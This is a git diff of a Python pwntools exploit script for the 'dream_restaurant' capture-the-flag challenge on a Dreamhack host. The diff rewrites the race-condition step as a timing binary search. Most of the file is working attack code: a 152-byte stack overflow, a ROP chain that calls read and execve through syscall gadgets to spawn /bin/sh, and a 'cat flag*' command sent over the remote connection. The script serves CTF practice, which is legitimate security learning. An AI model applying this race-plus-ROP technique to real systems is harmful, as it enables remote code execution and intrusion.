@@ -6,14 +6,13 @@ import time
 
 exe = ptr.ELF("./dream_restaurant")
 pwn.context.binary = pwn.ELF(exe.filepath)
-# libc = ptr.ELF("")
-# ld = ptr.ELF("")
 
-remote =  len(sys.argv) > 1 and sys.argv[1] == "remote"
+remote = len(sys.argv) > 1 and sys.argv[1] == "remote"
+
 
 def connect():
     if remote:
-        return pwn.remote("host3.dreamhack.games", 12528)
+        return pwn.remote("host3.dreamhack.games", 17331)
     else:
         return pwn.process(exe.filepath)
 
@@ -27,91 +26,90 @@ def unwrap(x):
 
 
 def main():
-    io = connect()
-
-    def sla(delim: bytes, data: bytes):
+    def sla(io, delim: bytes, data: bytes):
         io.sendlineafter(delim, data)
         return
 
-    def sa(delim: bytes, data: bytes):
+    def sa(io, delim: bytes, data: bytes):
         io.sendafter(delim, data)
         return
 
-    def sl(data: bytes):
+    def sl(io, data: bytes):
         io.sendline(data)
         return
 
-    def s(data: bytes):
+    def s(io, data: bytes):
         io.send(data)
         return
 
-    def r(size: int) -> bytes:
+    def r(io, size: int) -> bytes:
         return io.recv(size)
 
-    def ru(delim: bytes, drop: bool = False) -> bytes:
+    def ru(io, delim: bytes, drop: bool = False) -> bytes:
         return io.recvuntil(delim, drop=drop)
 
-    def rl() -> bytes:
+    def rl(io) -> bytes:
         return io.recvline()
 
-    def order(name: bytes):
-        sla(b"> ", b"1")
-        sla(b"want? ", name)
+    def order(io, name: bytes):
+        sla(io, b"> ", b"1")
+        sla(io, b"want? ", name)
         return
 
-    def order_unrecv(name: bytes):
-        sl(b"1")
-        sl(name)
+    def order_unrecv(io, name: bytes):
+        sl(io, b"1")
+        sl(io, name)
         return
 
-    def quit(payload : bytes):
-        sla(b"> ", b"3")
-        sla(b"'? ", payload)
+    def quit(io, payload: bytes):
+        sla(io, b"> ", b"3")
+        sla(io, b"'? ", payload)
         return
 
-    # RICE
-    # .cooking_time = 3133700
-    SOONDAE_GUKBAP= b"Soondae-gukbap"
+    SOONDAE_GUKBAP = b"Soondae-gukbap"
+    JJAMPPONG = b"Jjamppong"
 
-    # .cooking_time = 6221200
-    BUTADON = b"Butadon"
+    def make_race_condition():
+        max_timing = 4
+        min_timing = 0
+        while True:
+            io = connect()
 
-    # .cooking_time = 7331300
-    DONKATSU = b"Donkatsu-set"
+            timing = (max_timing + min_timing) / 2
+            ptr.logger.info(f"trying... {timing}")
+            order(io, SOONDAE_GUKBAP)
+            time.sleep(timing)
+            order(io, JJAMPPONG)
 
-    # NOODLE
-    # .cooking_time = 1337000
-    JAJANGMYEON = b"Jajangmyun"
+            ru(io, b"Your dish has arrived!")
+            ru(io, b"Your dish has arrived!")
 
-    # .cooking_time = 1337000
-    JJAMPPONG =  b"Jjamppong"
+            sl(io, b"2")
+            ru(io, b"Your dish")
+            line = rl(io)
 
-    # .cooking_time = 3133700
-    KALGUKSU = b"Kalguksu"
+            print(line)
+            if b"noodle menu" in line:
+                max_timing = timing
+                ru(io, b"Food name: ")
+                menu_name = rl(io).strip(b"\n")
+                print(menu_name)
+                if menu_name == SOONDAE_GUKBAP:
+                    return io
 
-    # .cooking_time = 2022600
-    RAMEN = b"Ramen"
+            if b"rice menu" in line:
+                min_timing = timing
 
-    order(SOONDAE_GUKBAP)
+            io.close()
 
-    attempt_count = 54
-    if remote:
-        # attempt_count = 40
-        # attempt_count = 31
-        attempt_count = 26
-    for _ in range(attempt_count):
-        order(JJAMPPONG)
+    io = make_race_condition()
 
-    # if remote:
-    #     io.interactive()
-    #     exit()
-
+    syscall = next(exe.gadget("syscall; ret;"))
     ret = next(exe.gadget("ret;"))
     pop_rdi = next(exe.gadget("pop rdi; ret;"))
     pop_rsi = next(exe.gadget("pop rsi; ret;"))
     pop_rax_rdx_rbx = next(exe.gadget("pop rax; pop rdx; pop rbx; ret;"))
-    syscall = next(exe.gadget("syscall; ret;"))
-    bin_sh = 0x4fc000
+    bin_sh = 0x00000000004FC000
 
     payload = b""
     payload += b"A" * 152
@@ -138,279 +136,13 @@ def main():
 
     assert b"\n" not in payload
 
-    time.sleep(3)
-    quit(payload)
-    sl(b"/bin/sh\0")
-    sl(b"cat flag*")
+    quit(io, payload)
+    sl(io, b"/bin/sh\0")
+    sl(io, b"cat flag*")
 
     io.interactive()
     return
 
-def main(ac):
-    io = connect()
-
-    def sla(delim: bytes, data: bytes):
-        io.sendlineafter(delim, data)
-        return
-
-    def sa(delim: bytes, data: bytes):
-        io.sendafter(delim, data)
-        return
-
-    def sl(data: bytes):
-        io.sendline(data)
-        return
-
-    def s(data: bytes):
-        io.send(data)
-        return
-
-    def r(size: int) -> bytes:
-        return io.recv(size)
-
-    def ru(delim: bytes, drop: bool = False) -> bytes:
-        return io.recvuntil(delim, drop=drop)
-
-    def rl() -> bytes:
-        return io.recvline()
-
-    def order(name: bytes):
-        sla(b"> ", b"1")
-        sla(b"want? ", name)
-        return
-
-    def order_unrecv(name: bytes):
-        sl(b"1")
-        sl(name)
-        return
-
-    def quit(payload : bytes):
-        sla(b"> ", b"3")
-        sla(b"'? ", payload)
-        return
-
-    # RICE
-    # .cooking_time = 3133700
-    SOONDAE_GUKBAP= b"Soondae-gukbap"
-
-    # .cooking_time = 6221200
-    BUTADON = b"Butadon"
-
-    # .cooking_time = 7331300
-    DONKATSU = b"Donkatsu-set"
-
-    # NOODLE
-    # .cooking_time = 1337000
-    JAJANGMYEON = b"Jajangmyun"
-
-    # .cooking_time = 1337000
-    JJAMPPONG =  b"Jjamppong"
-
-    # .cooking_time = 3133700
-    KALGUKSU = b"Kalguksu"
-
-    # .cooking_time = 2022600
-    RAMEN = b"Ramen"
-
-    order(SOONDAE_GUKBAP)
-
-    # attempt_count = 54
-    # if remote:
-    #     # attempt_count = 40
-    #     # attempt_count = 31
-    #     attempt_count = 26
-    for _ in range(ac):
-        order(JJAMPPONG)
-
-    # if remote:
-    #     io.interactive()
-    #     exit()
-
-    ret = next(exe.gadget("ret;"))
-    pop_rdi = next(exe.gadget("pop rdi; ret;"))
-    pop_rsi = next(exe.gadget("pop rsi; ret;"))
-    pop_rax_rdx_rbx = next(exe.gadget("pop rax; pop rdx; pop rbx; ret;"))
-    syscall = next(exe.gadget("syscall; ret;"))
-    bin_sh = 0x4fc000
-
-    payload = b""
-    payload += b"A" * 152
-    payload += ptr.p64(ret)
-    payload += ptr.p64(pop_rdi)
-    payload += ptr.p64(0)
-    payload += ptr.p64(pop_rsi)
-    payload += ptr.p64(bin_sh)
-    payload += ptr.p64(pop_rax_rdx_rbx)
-    payload += ptr.p64(0)
-    payload += ptr.p64(0x18)
-    payload += ptr.p64(0)
-    payload += ptr.p64(syscall)
-
-    payload += ptr.p64(pop_rdi)
-    payload += ptr.p64(bin_sh)
-    payload += ptr.p64(pop_rsi)
-    payload += ptr.p64(0)
-    payload += ptr.p64(pop_rax_rdx_rbx)
-    payload += ptr.p64(59)
-    payload += ptr.p64(0)
-    payload += ptr.p64(0)
-    payload += ptr.p64(syscall)
-
-    assert b"\n" not in payload
-
-    time.sleep(3)
-    quit(payload)
-    ru(b"Thank you for writing review. It will help improve our restaurant.")
-    sl(b"/bin/sh\0")
-    sl(b"cat flag*")
-    try:
-        dump = io.recvall(1)
-        print(dump)
-        if dump == b"":
-            return
-        exit()
-    except:
-        return
-
-    # io.interactive()
-    # return
-
-def determine_delay(attempt_count) -> bool:
-    io = connect()
-
-    def sla(delim: bytes, data: bytes):
-        io.sendlineafter(delim, data)
-        return
-
-    def sa(delim: bytes, data: bytes):
-        io.sendafter(delim, data)
-        return
-
-    def sl(data: bytes):
-        io.sendline(data)
-        return
-
-    def s(data: bytes):
-        io.send(data)
-        return
-
-    def r(size: int) -> bytes:
-        return io.recv(size)
-
-    def ru(delim: bytes, drop: bool = False) -> bytes:
-        return io.recvuntil(delim, drop=drop)
-
-    def rl() -> bytes:
-        return io.recvline()
-
-    def order(name: bytes):
-        sla(b"> ", b"1")
-        sla(b"want? ", name)
-        return
-
-    def order_unrecv(name: bytes):
-        sl(b"1")
-        sl(name)
-        return
-
-    def quit(payload : bytes):
-        sla(b"> ", b"3")
-        sla(b"'? ", payload)
-        return
-
-    # RICE
-    # .cooking_time = 3133700
-    SOONDAE_GUKBAP= b"Soondae-gukbap"
-
-    # .cooking_time = 6221200
-    BUTADON = b"Butadon"
-
-    # .cooking_time = 7331300
-    DONKATSU = b"Donkatsu-set"
-
-    # NOODLE
-    # .cooking_time = 1337000
-    JAJANGMYEON = b"Jajangmyun"
-
-    # .cooking_time = 1337000
-    JJAMPPONG =  b"Jjamppong"
-
-    # .cooking_time = 3133700
-    KALGUKSU = b"Kalguksu"
-
-    # .cooking_time = 2022600
-    RAMEN = b"Ramen"
-
-    order_unrecv(SOONDAE_GUKBAP)
-
-    # attempt_count = 54
-    # if remote:
-    #     # attempt_count = 40
-    #     # attempt_count = 31
-    #     attempt_count = 25
-    for _ in range(attempt_count):
-        order_unrecv(JJAMPPONG)
-
-    time.sleep(3)
-    print("hello")
-    exit()
-    io.interactive()
-    # sl(b"2")
-    # ru(b"Food name: ")
-    # name = rl().strip(b"\n")
-    # print(name)
-    # io.close()
-    # if name == JJAMPPONG:
-    #     return True
-    # else :
-    #     return False
-
-    # ret = next(exe.gadget("ret;"))
-    # pop_rdi = next(exe.gadget("pop rdi; ret;"))
-    # pop_rsi = next(exe.gadget("pop rsi; ret;"))
-    # pop_rax_rdx_rbx = next(exe.gadget("pop rax; pop rdx; pop rbx; ret;"))
-    # syscall = next(exe.gadget("syscall; ret;"))
-    # bin_sh = 0x4fc000
-
-    # payload = b""
-    # payload += b"A" * 152
-    # payload += ptr.p64(ret)
-    # payload += ptr.p64(pop_rdi)
-    # payload += ptr.p64(0)
-    # payload += ptr.p64(pop_rsi)
-    # payload += ptr.p64(bin_sh)
-    # payload += ptr.p64(pop_rax_rdx_rbx)
-    # payload += ptr.p64(0)
-    # payload += ptr.p64(0x18)
-    # payload += ptr.p64(0)
-    # payload += ptr.p64(syscall)
-
-    # payload += ptr.p64(pop_rdi)
-    # payload += ptr.p64(bin_sh)
-    # payload += ptr.p64(pop_rsi)
-    # payload += ptr.p64(0)
-    # payload += ptr.p64(pop_rax_rdx_rbx)
-    # payload += ptr.p64(59)
-    # payload += ptr.p64(0)
-    # payload += ptr.p64(0)
-    # payload += ptr.p64(syscall)
-
-    # assert b"\n" not in payload
-
-    # time.sleep(3)
-    # quit(payload)
-    # # sl(b"/bin/sh\0")
-    # # sl(b"cat flag*")
-
-    # io.interactive()
 
 if __name__ == "__main__":
-    # for i in range(20, 35):
-    #     print(i)
-    #     for _ in range(3):
-    #         main(i)
-    for i in range(1, 100):
-        print(i)
-        if determine_delay(i):
-            print("yattane!")
-            exit()
+    main()
